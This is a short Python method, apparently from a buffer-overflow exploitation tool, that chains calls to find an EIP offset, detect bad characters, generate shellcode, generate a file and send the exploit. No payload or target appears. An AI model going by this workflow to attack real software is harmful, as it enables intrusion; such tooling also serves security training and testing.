    def perform_bof(self) -> bool:
        if self.get_eip_offset() < 0:
            return False
        if self.find_bad_chars():
            return False
        if self.generate_shellcode():
            return False
        if self.expand_space():
            return False
        if self.generate_file():
            return False
        if self.send_exploit():
            return False
        return True
